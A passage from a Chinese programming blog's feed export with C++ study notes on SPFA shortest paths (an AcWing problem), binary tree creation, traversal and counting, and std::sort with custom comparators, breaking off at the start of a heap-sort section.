<span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环， 边权可能为负数。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 impossible。<br>数据保证不存在负权回路。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。<br>如果路径不存在，则输出 impossible。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">105</span>,<br>图中涉及边长绝对值均不超过 <span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> -<span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2e5</span>;<br><span class="hljs-type">int</span> head[N],val[N],ne[N],w[N],idx,dist[N],n,m;<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=b;<br>    w[idx]=c;<br>    ne[idx]=head[a];<br>    head[a]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    state[<span class="hljs-number">1</span>]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//用来判断是否入队列</span><br>    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> t=q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        state[t]=<span class="hljs-literal">false</span>;<span class="hljs-comment">//从队列取出后标记为假</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=head[t];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = val[i];<br>            <span class="hljs-keyword">if</span>(dist[j]&gt;dist[t]+w[i]) <span class="hljs-comment">// 如果边的权重更新，就将更新的点入栈</span><br>            &#123;<br>                dist[j]=dist[t]+w[i];<br>                <span class="hljs-keyword">if</span>(!state[j])&#123;<br>                    q.<span class="hljs-built_in">push</span>(j);<br>                    state[j]=<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(head,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> head);<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-built_in">add</span>(a,b,c);<br>    &#125;<br>    <span class="hljs-built_in">spfa</span>();<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) cout&lt;&lt;<span class="hljs-string">&quot;impossible&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">else</span> cout&lt;&lt;dist[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>stl</tag>
      
      <tag>acwing</tag>
      
      <tag>c++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树学习</title>
    <link href="/2022/10/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/10/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="先序创建二叉树"><a href="#先序创建二叉树" class="headerlink" title="先序创建二叉树"></a>先序创建二叉树</h1><p><strong>算法思想</strong></p><p>先序创建二叉树采用递归的方式实现，先传入二叉树的根节点指针的地址，然后依次递归读入二叉树节点，当读入的是‘@’时，将递归得到的根节点赋予NULL，当读入的不为‘@’时，将该值赋值到根节点值，并依此递归左儿子和右儿子。</p><p><strong>关键问题1:为什么要传入根节点的地址?</strong></p><p>因为我们已知的是根节点指针，它指向malloc开辟的BiTree空间的首地址，当传入的是根节点指针而不是根节点指针的地址时，在函数中会copy一个该根节点指针指向的空间。但我们如果传入的是根节点指针的地址，函数内部不会重新copy一个空间。</p><p><strong>其思想与函数传入实参和形参相似</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Traverser.cpp&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree* root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    <span class="hljs-built_in">PreOrderTraverser</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h1><h2 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//递归实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        <span class="hljs-built_in">InOrderTraverser</span>(T-&gt;lchild);<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">InOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        <span class="hljs-built_in">PostOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PostOrderTraverser</span>(T-&gt;rchild);<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//非递归实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraverser_2</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    stack&lt;BiTree*&gt; op;<br>    BiTree* p=T;<br>    <span class="hljs-keyword">while</span>(p||op.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p)&#123;<br>            op.<span class="hljs-built_in">push</span>(p);<br>            p=p-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            p=op.<span class="hljs-built_in">top</span>();    <br>            op.<span class="hljs-built_in">pop</span>();<br>            cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;                                           <br>            p=p-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser_2</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    stack&lt;BiTree*&gt;op;<br>    BiTree* p=T;<br>    <span class="hljs-keyword">while</span>(p||op.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p)&#123;<br>            cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            op.<span class="hljs-built_in">push</span>(p);<br>            p=p-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            p=op.<span class="hljs-built_in">top</span>();<br>            op.<span class="hljs-built_in">pop</span>();<br>            p=p-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree* root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    <span class="hljs-built_in">PreOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">PreOrderTraverser_2</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">InOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">InOrderTraverser_2</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">PostOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="具体原理（递归）"><a href="#具体原理（递归）" class="headerlink" title="具体原理（递归）"></a>具体原理（递归）</h2><h2 id="具体原理（非递归）"><a href="#具体原理（非递归）" class="headerlink" title="具体原理（非递归）"></a>具体原理（非递归）</h2><h1 id="计算二叉树"><a href="#计算二叉树" class="headerlink" title="计算二叉树"></a>计算二叉树</h1><h2 id="代码部分-1"><a href="#代码部分-1" class="headerlink" title="代码部分"></a>代码部分</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">BiTreeDepth</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!T) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-type">int</span> m=<span class="hljs-built_in">BiTreeDepth</span>(T-&gt;lchild);<br>        <span class="hljs-type">int</span> n=<span class="hljs-built_in">BiTreeDepth</span>(T-&gt;rchild);<br>        <span class="hljs-keyword">return</span> m&gt;n?(m+<span class="hljs-number">1</span>):(n+<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CountNode</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CountNode</span>(T-&gt;lchild)+<span class="hljs-built_in">CountNode</span>(T-&gt;rchild)+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CountLeaves</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>((!T-&gt;lchild)&amp;&amp;(!T-&gt;rchild))  cnt++;;<br>    <span class="hljs-type">int</span> lcnt=<span class="hljs-built_in">CountLeaves</span>(T-&gt;lchild);<br>    <span class="hljs-type">int</span> rcnt=<span class="hljs-built_in">CountLeaves</span>(T-&gt;rchild);<br>    cnt+=lcnt+rcnt;<br>    <span class="hljs-keyword">return</span> cnt;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree *root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    cout&lt;&lt;<span class="hljs-built_in">BiTreeDepth</span>(root)&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="原理部分"><a href="#原理部分" class="headerlink" title="原理部分"></a>原理部分</h2>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>算法学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法学习</title>
    <link href="/2022/10/22/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/10/22/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="sort函数（sort和cmp配合使用）"><a href="#sort函数（sort和cmp配合使用）" class="headerlink" title="sort函数（sort和cmp配合使用）"></a>sort函数（sort和cmp配合使用）</h2><p>sort函数（c++）可以对数据进行排序和自定义排序（cmp配合使用）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">从小到大排序可以写成<br><span class="hljs-built_in">sort</span>(a,a+n,<span class="hljs-built_in">less</span>&lt;要进行排序的数据类型&gt;())<span class="hljs-comment">//a是数组的首地址，a+n是数组的尾地址(也可以是结构体数组)</span><br>从大到小排序可以写成<br><span class="hljs-built_in">sort</span>(a,a+n,<span class="hljs-built_in">greater</span>&lt;要进行排序的数据类型&gt;())<br><br></code></pre></td></tr></table></figure><p>sort可以和cmp函数配合使用进行自定义的结构体排序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-comment">//定义结构体</span><br>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">double</span> a,b,c;<br>    <span class="hljs-type">double</span> sum;<br>&#125;student;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> student &amp;a,<span class="hljs-type">const</span> student &amp;b)</span><span class="hljs-comment">//cmp函数原型，其中形参要取地址，因为要变换原数据的位置</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a.sum!=b.sum) <span class="hljs-keyword">return</span> a.sum&gt;b.sum;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.a!=b.a) <span class="hljs-keyword">return</span> a.a&gt;b.a;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.b!=b.b) <span class="hljs-keyword">return</span> a.b&gt;b.b;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> a.c&gt;b.c;<br>&#125;<br><span class="hljs-comment">//cmp函数返回为true时不会变化位置，当返回false时会变换位置，所以return a.c&gt;b.c就是降序排列，return a.c&lt;b.c就是升序排序</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    student a[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">sort</span>(a,a+n,cmp);<span class="hljs-comment">//进行自定义排序</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p><strong>分析1：为什么从无序数组创建堆要从n&#x2F;2开始？</strong></p><p>因为堆为完全二叉树，完全二叉树中父亲和儿子的地址拥有如下关系：<strong>父亲X2&#x3D;左儿子，父亲X2+1&#x3D;右儿子，左儿子&#x2F;2&#x3D;右儿子&#x2F;2&#x3D;父亲</strong>。</p><p><strong>分析2：升序和降序如何选择大根堆或者小根堆？</strong></p><p>在升序中通常采用小根堆，在降序中采用大根堆。因为用数组模拟堆时，删除首元素比较麻烦，但是删除最后一个元素非常方便，直接让首元素等于最后一个元素，然后在不断down首元素得到正确的堆</p><p><strong>分析3：为什么在down()函数中要不断递归呢？</strong></p><p>因为创建堆的时候，当父亲比两个儿子都大的时候，我们找到三个中最小的一个，并交换位置，但是我们并不知道父亲在整个堆的位置，所以我们要不断down来正确找到父亲的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 